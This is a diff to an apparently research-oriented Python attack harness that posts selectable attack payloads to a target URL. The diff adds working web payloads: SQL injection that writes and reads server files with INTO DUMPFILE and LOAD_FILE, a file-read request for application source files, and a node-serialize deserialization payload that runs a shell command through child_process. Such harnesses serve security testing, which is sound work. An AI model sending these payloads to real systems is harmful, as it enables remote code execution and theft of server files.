@@ -97,7 +97,7 @@ if __name__ == "__main__":
     )
     parser.add_argument(
         "--data_attack_type",
-        choices=["modify", "leak", "warm1", "warm2", "warm", "cfattack", "escape", "normal" , "read", "sql"],
+        choices=["modify", "leak", "warm1", "warm2", "warm", "cfattack", "escape", "normal" , "read", "sql" , "ser" ],
         required=True,
         help="Type of attack data",
     )
@@ -187,7 +187,7 @@ if __name__ == "__main__":
         "user": "alice",  
         "creditCard": "1234-5678-9",  
         "malicious": "readFiles",   
-        "fileName": "./handler.js", 
+        "fileName":[ "./handler.js" ,  "./index.js" ], 
     }
 
     data_attack_sql = {  
@@ -195,9 +195,16 @@ if __name__ == "__main__":
         "user": "alice",  
         "creditCard": "1234-5678-9",    
         "malicious": "sqlInjection",    
-        "sql" : "1;",
-       # "sql": "1; SELECT LOAD_FILE('/etc/passwd') --",  
-        "fileName" : "2.txt"
+        "sql1" : "SELECT '13579' INTO DUMPFILE '/var/lib/mysql-files/tmp.txt';",
+        "sql2": "SELECT LOAD_FILE('/var/lib/mysql-files/tmp.txt') AS file_content;",  
+    }
+
+    data_attack_ser = {  
+        "id": 1,  
+        "user": "alice",  
+        "creditCard": "1234-5678-9",    
+        "malicious": "deserialize",    
+        "payload":  '{"function":"_$$ND_FUNC$$_function() { return require(\'child_process\').execSync(\'whoami\').toString().trim(); }()"}'
     }
 
     if args.data_attack_type == "modify":
@@ -220,6 +227,8 @@ if __name__ == "__main__":
         data_attack = [data_attack_read]
     elif args.data_attack_type == "sql":
         data_attack = [data_attack_sql]
+    elif args.data_attack_type == "ser":
+        data_attack = [data_attack_ser]
 
     perform_requests(
         url,
